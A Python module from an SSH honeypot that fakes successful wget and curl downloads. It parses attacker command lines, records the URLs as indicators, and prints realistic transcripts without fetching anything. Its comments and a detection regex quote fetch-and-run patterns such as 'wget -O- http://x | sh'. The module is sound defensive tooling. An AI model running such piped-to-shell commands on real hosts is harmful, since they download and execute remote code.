"""Emulated file retrieval — wget and curl.

The SSH emulator answered every ``wget`` and ``curl`` with ``command not
found``. Almost every real Linux host has at least one of them, so that reply
is both a fingerprint and, more importantly, the point at which every dropper
gives up. A loader that fetches its payload gets one line into its script and
stops, and the C2 URL it was about to reveal, the payload name, the
architecture it selected and everything it would have run afterwards are never
observed. That is the single most valuable moment in an SSH honeypot session
and the emulator was throwing it away.

So the download is emulated as *succeeding*. Nothing is fetched: the URL is
parsed, recorded as an indicator, and a plausible transcript is printed. The
honeypot makes no outbound connection of any kind here, which is what keeps
the egress guarantee intact while still letting the attack chain continue.
"""

from __future__ import annotations

import posixpath
import random
import re
import urllib.parse
from dataclasses import dataclass
from datetime import datetime, timezone

#: Argument-looking tokens that are not the URL.
_FLAG = re.compile(r"^-")

#: Bounded so a pathological command line cannot be used to build a huge reply.
MAX_URL_LENGTH = 2048


@dataclass
class Download:
    tool: str
    url: str
    host: str
    port: int
    filename: str
    #: Where the attacker asked for it to land, as written on the command
    #: line. Kept separate from ``filename`` so ``-O /tmp/x86`` drops the file
    #: in /tmp while the transcript still names it ``x86``.
    target: str
    #: True when the fetched content is piped straight into a shell
    #: (``curl … | sh``) — nothing is written to disk in that case.
    piped: bool
    #: True when curl was asked to save rather than print.
    saves: bool


def parse(command: str) -> Download | None:
    """Pull the retrieval intent out of a wget/curl command line.

    Returns ``None`` when the command is not a fetch we can emulate, so the
    caller can fall through to its normal handling.
    """
    stripped = command.strip()
    # A pipeline is split so ``wget -O- http://x | sh`` is still recognised.
    head = re.split(r"[|;&]", stripped)[0].strip()
    tokens = head.split()
    if not tokens:
        return None

    tool = posixpath.basename(tokens[0])
    if tool not in ("wget", "curl"):
        return None

    piped = bool(re.search(r"\|\s*(?:/bin/)?(?:ba)?sh\b", stripped))

    url = None
    output = None
    saves = tool == "wget"
    skip_next = False
    for i, token in enumerate(tokens[1:], start=1):
        if skip_next:
            skip_next = False
            continue
        if _FLAG.match(token):
            # -O name / -o name take a value; -O- writes to stdout.
            if token in ("-O", "-o", "--output", "--output-document"):
                nxt = tokens[i + 1] if i + 1 < len(tokens) else None
                if nxt and nxt != "-":
                    output = nxt
                    saves = True
                elif nxt == "-":
                    saves = False
                skip_next = True
            elif token in ("-O-", "-o-"):
                saves = False
            elif token.startswith(("-O", "-o")) and len(token) > 2:
                output = token[2:]
                saves = True
            elif token in ("-Os", "-sO"):
                saves = True
            continue
        if url is None:
            url = token
    if not url:
        return None

    url = url.strip("'\"")[:MAX_URL_LENGTH]
    if "://" not in url:
        url = "http://" + url

    try:
        parsed = urllib.parse.urlparse(url)
    except ValueError:
        return None
    host = parsed.hostname or ""
    if not host:
        return None

    if output is None:
        output = posixpath.basename(parsed.path) or "index.html"
    target = output
    # Never let a crafted URL escape into a path the emulator prints back.
    output = posixpath.basename(output) or "index.html"

    try:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
    except ValueError:
        port = 80

    return Download(
        tool=tool,
        url=url,
        host=host,
        port=port,
        filename=output,
        target=target,
        piped=piped,
        saves=saves and not piped,
    )


def _size_for(filename: str) -> int:
    """A plausible size, stable for a given name within one process run."""
    if re.search(r"\.(sh|py|pl|txt)$", filename):
        return random.randint(400, 6_000)
    return random.randint(20_000, 180_000)


def _is_ip_literal(host: str) -> bool:
    return bool(re.fullmatch(r"[0-9.]+", host)) or ":" in host


def _connect_lines(download: Download) -> str:
    """wget's resolve/connect preamble.

    An IP literal is not resolved, and wget does not print a Resolving line
    for one. Getting this wrong is a cheap tell for anyone who has read real
    wget output, which is most people writing droppers.
    """
    if _is_ip_literal(download.host):
        return f"Connecting to {download.host}:{download.port}... connected.\n"
    resolved = "10.0.0.9"
    return (
        f"Resolving {download.host} ({download.host})... {resolved}\n"
        f"Connecting to {download.host} ({download.host})|{resolved}|"
        f":{download.port}... connected.\n"
    )


def transcript(download: Download, size: int) -> str:
    """What the tool would have printed on a successful fetch."""
    now = datetime.now(timezone.utc)
    stamp = now.strftime("%Y-%m-%d %H:%M:%S")

    if download.tool == "wget":
        if not download.saves:
            # -O- streams to stdout; wget still logs progress to stderr.
            return (
                f"--{stamp}--  {download.url}\n"
                + _connect_lines(download)
                + "HTTP request sent, awaiting response... 200 OK\n"
                f"Length: {size} ({size // 1024}K) [application/octet-stream]\n"
                "Saving to: 'STDOUT'\n\n"
                f"-                   100%[===================>] "
                f"{size / 1024:6.2f}K  --.-KB/s    in 0.04s\n\n"
                f"{stamp} ({size / 51200:.2f} MB/s) - written to stdout "
                f"[{size}/{size}]\n"
            )
        return (
            f"--{stamp}--  {download.url}\n"
            + _connect_lines(download)
            + "HTTP request sent, awaiting response... 200 OK\n"
            f"Length: {size} ({size // 1024}K) [application/octet-stream]\n"
            f"Saving to: '{download.filename}'\n\n"
            f"{download.filename[:19]:<19} 100%[===================>] "
            f"{size / 1024:6.2f}K  --.-KB/s    in 0.04s\n\n"
            f"{stamp} ({size / 51200:.2f} MB/s) - '{download.filename}' saved "
            f"[{size}/{size}]\n"
        )

    # curl is silent unless it is showing its progress meter, which it does
    # only when output is not a terminal-bound stdout.
    if download.saves:
        return (
            "  % Total    % Received % Xferd  Average Speed   Time    Time"
            "     Time  Current\n"
            "                                 Dload  Upload   Total   Spent"
            "    Left  Speed\n"
            f"100 {size // 1024:5d}  100 {size // 1024:5d}    0     0  "
            f"{size // 1024:5d}      0 --:--:-- --:--:-- --:--:-- {size // 512:5d}\n"
        )
    return ""


def size_for(download: Download) -> int:
    return _size_for(download.filename)
